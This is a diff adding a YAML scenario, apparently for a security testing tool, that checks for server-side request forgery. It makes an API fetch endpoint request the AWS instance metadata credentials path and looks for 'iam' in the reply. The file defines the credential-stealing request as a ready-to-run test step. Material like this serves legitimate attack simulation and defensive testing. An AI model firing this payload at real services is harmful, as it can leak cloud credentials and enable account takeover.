@@ -1,0 +1,15 @@
+name: ssrf-metadata
+description: "SSRF to AWS IMDSv1 metadata endpoint — attempt to retrieve instance credentials via server-side request forgery"
+mitre_technique_ids: ["T1552.005"]
+tags: [api, owasp-a10, ssrf, cloud, aws]
+severity: critical
+timeout: 1m
+steps:
+  - kind: ssrf
+    params:
+      endpoint: /api/v1/fetch
+      url_param: url
+      target_url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      expected_leak_indicator: "iam"
+      method: GET
+      follow_redirects: false
